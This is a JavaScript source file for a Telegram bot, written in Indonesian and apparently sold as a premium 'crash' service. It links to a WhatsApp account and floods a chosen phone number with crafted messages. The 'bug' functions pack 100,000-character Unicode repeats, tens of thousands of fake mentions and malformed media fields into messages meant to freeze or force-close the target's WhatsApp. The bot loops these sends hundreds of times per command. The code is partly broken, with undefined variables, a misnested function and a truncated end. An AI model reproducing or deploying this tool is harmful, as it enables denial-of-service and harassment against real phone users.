const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Ndok = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/i52sne.jpeg",
    "https://files.catbox.moe/i52sne.jpeg",
    "https://files.catbox.moe/i52sne.jpeg",
    "https://files.catbox.moe/i52sne.jpeg",
    "https://files.catbox.moe/i52sne.jpeg",
    "https://files.catbox.moe/i52sne.jpeg"
 
]; 


const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Ndok = makeWASocket(connectionOptions);

    Ndok.ev.on('creds.update', saveCreds);
    store.bind(Ndok.ev);

    Ndok.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭──────────────────────⟤
│  ${chalk.green.bold('WHATSAPP TERHUBUNG')}
╰──────────────────────⟤`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('WHATSAPP TERPUTUS')}
╰──────────────────────⟤`),
                shouldReconnect ? chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('HUBUNGKAN ULANG')}
╰──────────────────────⟤`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.. Buy Premium Di @Ftmncloud");
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan /connect terlebih dahulu.");
    return;
  }
  next();
};

bot.command('menu', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel

    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\` 
┏━━━━━⌠ 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 ⌡
┃▢ 𝙳𝙴𝚅𝙾𝙻𝙾𝙿𝙴𝚁 : @Ftmncloud
┃▢ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 5.0 (BETA) 
┃▢ 𝚂𝚃𝙰𝚃𝚄𝚂 : VIP Script
┃▢ 𝙻𝙴𝙰𝙶𝚄𝙴 : Java Scrip 
┗━━━━━━━━━━━━━━━━━━━━━❍
┏━━━━━⌠ 𝙼𝙴𝙽𝚄 𝙾𝚆𝙽 ⌡
┃▢ /𝙲𝙾𝙽𝙽𝙴𝙲𝚃 628xx
┃▢ /𝙰𝙳𝙳𝙿𝚁𝙴𝙼 ɪᴅ 
┃▢ /𝙳𝙴𝙻𝙿𝚁𝙴𝙼 ɪᴅ 
┃▢ /𝙲𝙴𝙺𝙿𝚁𝙴𝙼 ɪᴅ
┗━━━━━━━━━━━━━━━━━━━━━❍
┏━━━━━⌠ 𝙼𝙴𝙽𝚄 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴 ⌡
┃▢ /𝚁𝚈𝚈𝙲𝚁𝙰𝚂𝙷 628x
┃    ╰> 𝙲𝚁𝙰𝚂𝙷𝙷 𝙰𝙻𝙻 𝚆𝙰
┃▢ /𝚁𝚈𝚈𝙻𝙰𝚈 628x
┃    ╰> 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴 𝙳𝙴𝙻𝙰𝚈
┗━━━━━━━━━━━━━━━━━━━━━❍      
┏━━━━━⌠ 𝙽𝙾𝙽 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴 ⌡
┃▢ /𝚁𝙸𝙸𝙱𝙻𝙰𝙽𝙺 628x
┃    ╰> 𝙱𝙻𝙰𝙽𝙺 𝚂𝙸𝚂𝚃𝙴𝙼 𝚄𝙸
┃▢ /𝚁𝙸𝙸𝙾𝚂 628x
┃    ╰> 𝙱𝙻𝙰𝙽𝙺 𝚂𝙸𝚂𝚃𝙴𝙼 𝙸𝙾𝚂
┗━━━━━━━━━━━━━━━━━━━━━❍

┏━━━━━⌠ 𝙵𝙾𝚁𝙴𝙲𝙻𝙾𝚂𝙴 + 𝚄𝙸 ⌡
┃▢ /𝚁𝙸𝙸𝚄𝙸 628x
┃    ╰> 𝚂𝚃𝙾𝙿 𝚂𝚈𝚂𝚃𝙴𝙼 𝚄𝙸
┃▢ /𝚁𝙸𝙸𝙵𝙲 628x
┃    ╰> 𝙵𝙾𝚁𝙲𝙻𝙾𝚂𝙴 𝚆𝙰 𝙰𝙿𝙿
┃▢ /𝚁𝙸𝙸𝙸𝙼𝙰𝙶𝙴 628x
┃    ╰> 𝙱𝚄𝙶 𝙸𝙼𝙰𝙶𝙴
┃▢ /𝚁𝙸𝙸𝙲𝙾𝙼𝙱𝙾 628x
┃    ╰> 𝙲𝙾𝙼𝙱𝙾 𝙰𝙻𝙻 𝙱𝚄𝙶
┗━━━━━━━━━━━━━━━━━━━━━❍

\`\`\` `,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.url('「🌟 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 」', 'https://whatsapp.com/channel/0029Vb2G0U6L7UVQSTpmfy2q')],
[Markup.button.url('「🌟 𝐋𝐈𝐍𝐊 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂 」','https://chat.whatsapp.com/LiBmJj1b5I9CUSt5MDTqf5')]
        ])
    });
});


bot.command("riiblank", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 870; i++) {
    await NanCrashiPhone(target);
    await NanCrashiPhone(target);
    await NanCrashiPhone(target);
    await NanCrashiPhone(target);
    await NanCrashiPhone(target);
    await NanCrashiPhone(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    
    }
    
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE KILLBLANK:✅`,{ parse_mode: "Markdown" });
});


bot.command("riiui", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 870; i++) {
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE STOP SYSTEM UI:✅`,{ parse_mode: "Markdown" });
});


bot.command("riicombo", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 870; i++) {
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await protocolbug7(isTarget, mention);
    await protocolbug7(isTarget, mention);
    await protocolbug7(isTarget, mention);
    await ForcloseInfinity(sock, target);
    await ForcloseInfinity(sock, target);
    await ForcloseInfinity(sock, target);
    await ForcloseInfinity(sock, target);
    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE KILL SYSTEM:✅`,{ parse_mode: "Markdown" });
});


bot.command("riiimage", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 870; i++) {
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE RESTART SYSTEM:✅`,{ parse_mode: "Markdown" });
});


bot.command("riifc", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 870; i++) {
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE FC WHATSAPP APP:✅`,{ parse_mode: "Markdown" });
});


bot.command("ryycrash", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 870; i++) {
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);

    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE CRASHALLWA:✅`,{ parse_mode: "Markdown" });
});

bot.command("ryylay", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 870; i++) {
    await isagivisble1(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);


    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE INVISIBLE NEW:✅`,{ parse_mode: "Markdown" });
});

bot.command("riios", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 
  
    for (let i = 0; i < 870; i++) {
   await NanBlankIphone(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    await isagivisble1(target);
    await isagivisble2(target);
    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE CRASIPHONE✅`,{ parse_mode: "Markdown" });
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Ndok && Ndok.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Ndok.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});
  
// ========================= [ CRASH FUNCT ] =========================
 async function NanBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉" + "ી".repeat(100000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(100000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await Ndok.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}       


async function isagivisble1(target) {
let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Ndok.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
exports.carousels2 = async(client, target, fJids) => {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { image: imgCrL },
    { upload: client.waUploadToServer }
  );

  const header = proto.Message.InteractiveMessage.Header.fromObject({
    imageMessage: media.imageMessage,
    title: '🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉',
    gifPlayback: false,
    subtitle: '🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉',
    hasMediaAttachment: true
  });

  for (let r = 0; r < 1000; r++) {
    cards.push({
      header,
      body: {
        text: "🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "view",
              url: "https://example.com"
            })
          }
        ]
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉"
            },
            footer: {
              text: "🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  );
  
  await Ndok.relayMessage(
    target,
    msg.message,
    fJids
      ? { participant: { jid: target, messageId: null } }
      : {}
  );
}
async function isagivisble2(target) {
        	try {
        		let messageObject = await generateWAMessageFromContent(target, {
        			viewOnceMessage: {
        				message: {
        					extendedTextMessage: {
        						text: `🩸𝐈𝐬𝖆𝖌𝖎𝖎 𝐊𝖎𝖑𝖑 𝐘𝖔𝖚𝖚🩸`,
        						contextInfo: {
        							mentionedJid: Array.from({
        								length: 30000
        							}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
        							isSampled: true,
        							participant: target,
        							remoteJid: "status@broadcast",
        							forwardingScore: 9741,
        							isForwarded: true
        						}
        					}
        				}
        			}
        		}, {});
        		await Ndok.relayMessage("status@broadcast", messageObject.message, {
        			messageId: messageObject.key.id,
        			statusJidList: [target],
        			additionalNodes: [{
        				tag: "meta",
        				attrs: {},
        				content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target },
        						content: undefined,
        					}],
        				}],
        			}],
        		});
        	} catch (err) {
        		console.log(err)
        		await Ndok.sendMessage("! Error Type", err)
        	}
        	console.log(chalk.green("Succesfully Send Bug Invisible"));
        	
async function ForcloseInfinity(sock, target) {
  try {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: 'T R A V A F O R C L O S E',
              hasMediaAttachment: true,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7818-24/11734305_1146343427248320_57551642359982400177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                mimetype: "image/jpeg"
              }
            },
            body: {
              text: 'ZYNZZ VS EVERYBODY '.repeat(15500)
            },
            footer: {
              text: 'FORCLOSE INFINITY '.repeat(15500)
            },
            buttons: [
              {
                buttonId: "crash_button",
                buttonText: { displayText: "💥 CRASH" + "ꦾ" },
                type: 1
              }
            ]
          },
          contextInfo: {
            quotedMessage: {
              conversation: "Sent"
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    console.log(chalk.green(`Successfully Send ${chalk.red("FORCLOSE INFINITY")} to ${target}`));
  } catch (err) {
    console.error(chalk.red(`Error sending to ${target}: ${err.message}`));
  }
}
        }
        
async function protocolbug7(isTarget, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await client.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await client.relayMessage(isTarget, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
